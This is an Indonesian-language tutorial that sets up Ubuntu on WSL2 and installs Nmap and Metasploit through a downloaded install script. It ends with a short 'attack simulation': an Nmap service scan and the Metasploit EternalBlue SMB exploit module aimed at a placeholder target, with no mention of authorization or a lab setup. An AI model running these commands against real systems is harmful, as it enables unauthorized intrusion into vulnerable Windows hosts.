# **Hands-On: Instalasi Ubuntu WSL2 untuk Double OS**

#### **Langkah 1: Aktifkan WSL2 di Windows**
1. Buka PowerShell sebagai Administrator.
2. Jalankan perintah berikut:
   ```powershell
   wsl --install
   ```
3. Restart komputer Anda.

---

#### **Langkah 2: Instal Ubuntu di WSL2**
1. Buka Microsoft Store.
2. Cari "Ubuntu" dan pilih versi terbaru.
3. Klik "Install" dan tunggu hingga selesai.
4. Setelah instalasi selesai, buka Ubuntu dari Start Menu.

---

#### **Langkah 3: Konfigurasi Ubuntu WSL2**
1. Setelah pertama kali membuka Ubuntu, buat username dan password.
2. Update sistem:
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

---

#### **Langkah 4: Instal Tools Hacking di Ubuntu WSL2**
1. Instal Nmap:
   ```bash
   sudo apt install nmap
   ```
2. Instal Metasploit Framework:
   ```bash
   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
   chmod +x msfinstall
   ./msfinstall
   ```

---

#### **Langkah 5: Simulasi Serangan Dasar di Ubuntu WSL2**
- **Nmap Scanning**:
  ```bash
  nmap -sV <target_IP>
  ```
- **Metasploit Framework**:
  ```bash
  msfconsole
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS <target_IP>
  exploit
  ```
